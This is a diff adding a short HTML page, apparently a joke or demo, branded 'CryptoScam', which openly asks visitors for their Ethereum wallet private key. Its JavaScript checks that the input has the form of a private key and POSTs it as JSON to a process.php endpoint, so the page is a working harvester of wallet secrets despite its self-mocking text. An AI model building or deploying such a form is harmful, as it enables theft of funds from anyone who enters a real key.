@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+    <meta charset="UTF-8">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+</head>
+
+<body>
+    <div class="container valign-wrapper" style=" max-width: 500px; height: 100vh">
+        <!-- Page Content goes here -->
+        <div class="center-align" style="width: 100vw">
+            <img src="ethereum.png" width="150px" style="margin-bottom: 3em;">
+            <h4 style="font-weight: bold;">CryptoScam</h4>
+            <p class="flow-text">The hottest new crypto scam! Send us your Ethereum wallet private key to "recover" below. 👇</p>
+            <br>
+
+            <div id="error"> </div>
+            <br>
+
+            <div class="input-field">
+                <input id="wallet" type="text">
+                <label for="wallet">Private Key</label>
+            </div>
+
+            <button class="btn waves-effect waves-light grey darken-3" onclick="sendwallet()">Submit
+                <i class="material-icons right"></i>
+            </button>
+
+        </div>
+    </div>
+
+    <script>
+        function sendwallet() {
+            var walletVal = document.getElementById("wallet").value;
+            const xhttp = new XMLHttpRequest();
+
+            var re = new RegExp("^0x[a-fA-F0-9]{64}$");
+
+            // if invalid wallet!
+            if (!re.test(walletVal)) {
+                document.getElementById("error").innerHTML = "<p class=\"red card\">Not a valid private key to scam!</p>";
+            }
+
+            else {
+                document.getElementById("error").innerHTML = "<p class=\"green card\">Congrats you got scammed!</p>";
+                document.getElementById("wallet").innerHTML = "";
+
+                xhttp.open("POST", "process.php");
+                xhttp.setRequestHeader("Content-type", "application/json");
+                xhttp.send("{\"eth\":\"" + walletVal + "\"}");
+            }
+        }
+    </script>
+</body>
+
+</html>
